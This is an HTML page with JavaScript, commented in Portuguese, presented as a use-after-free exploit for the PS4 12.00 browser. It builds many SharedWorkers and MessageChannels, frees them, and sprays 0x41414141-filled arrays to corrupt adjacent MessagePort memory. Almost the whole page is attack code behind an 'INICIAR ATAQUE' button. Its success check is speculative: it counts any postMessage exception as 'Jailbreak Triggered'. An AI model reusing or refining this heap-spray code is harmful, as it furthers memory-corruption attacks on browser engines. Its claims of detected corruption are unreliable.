<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 MessagePort UAF</title>
   
</head>
<body>

    <h1>PS4 12.00 - MESSAGE PORT CORRUPTION</h1>
    <h3>Estratégia: SharedWorker -> MessagePort Overlap</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="run_port_exploit()">INICIAR ATAQUE</button>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. O CORRUPTOR (OBJETO FALSO)
        // =================================================================
        function build_fake_port() {
            var size = 0x400; 
            var buffer = new Uint32Array(size / 4);
            
            // Simular uma estrutura de Porta Corrompida
            // Preenchemos com 0x41414141
            // Se conseguirmos ler "AAAA" de uma porta viva, ganhamos.
            buffer.fill(0x41414141);
            
            return buffer;
        }

        // =================================================================
        // 2. EXECUÇÃO
        // =================================================================
        var channels = [];
        var workers = [];
        var fake_obj = build_fake_port();

        async function run_port_exploit() {
            if(!window.SharedWorker) return log("Navegador incompatível.");
            
            log("Fase 1: Criando emaranhado de Portas e Workers...");
            
            // Tática: Criar muitos canais e workers intercalados
            // [Worker] [PortA] [PortB] [Worker] [PortC] [PortD] ...
            
            for(let i=0; i < 500; i++) {
                try {
                    // 1. Cria Worker
                    let w = new SharedWorker("data:text/javascript,1", "w"+i);
                    w.port.start();
                    workers.push(w);

                    // 2. Cria Canal (2 Portas)
                    let mc = new MessageChannel();
                    // Adicionamos propriedades para identificar depois
                    mc.port1.id = i;
                    mc.port2.id = i;
                    channels.push(mc);

                } catch(e){}
                
                if(i%50==0) log(`Alocados: ${i}`);
            }

            log("Fase 2: Trigger & Spray (Corrupção de Porta)...");
            
            // Loop Reverso
            var idx = workers.length - 1;
            var found = false;

            var timer = setInterval(() => {
                if(idx < 300 || found) { // Paramos antes do fim para não quebrar tudo
                    clearInterval(timer);
                    if(!found) log("Falha: Nenhuma porta corrompida.");
                    return;
                }

                // A. Libera Worker
                var victim = workers[idx];
                victim.port.close();
                workers[idx] = null;

                // B. Spray Imediato (Tenta ocupar o lugar do Worker)
                // Se o Worker e a Porta estiverem no mesmo Slab, o spray pode
                // sobrescrever os dados da Porta vizinha (channels[idx]).
                var spray = [];
                for(let k=0; k<40; k++) {
                    spray.push(new Uint32Array(fake_obj));
                }

                // C. VERIFICAÇÃO
                // Tentamos ver se a porta vizinha mudou de comportamento
                // Uma porta corrompida pode falhar ao enviar mensagem ou mudar propriedades
                var target = channels[idx];
                try {
                    // Teste 1: A porta ainda está viva?
                    // Teste 2: Se enviarmos mensagem, ela volta corrompida?
                    
                    // Se o spray funcionou, a estrutura interna da porta virou 0x41414141
                    // Tentar usar 'postMessage' deve causar comportamento estranho ou exceção específica
                    
                    target.port1.postMessage("ping");
                    
                } catch(e) {
                    // SE DER ERRO AQUI, PODE SER SINAL DE CORRUPÇÃO!
                    log(`Evento na Porta ${idx}: ${e}`, "success");
                    
                    // Verifica se o erro é "Object is detached" ou similar
                    // Se o ponteiro interno virou lixo, o browser acha que a porta morreu
                    found = true;
                    clearInterval(timer);
                    log("!!! POTENCIAL CORRUPÇÃO DETECTADA !!!", "success");
                    log("O spray sobrescreveu a estrutura da porta.", "success");
                    alert("Jailbreak Triggered: Port Corruption!");
                }

                idx--;
            }, 20);
        }
    </script>
</body>
</html>
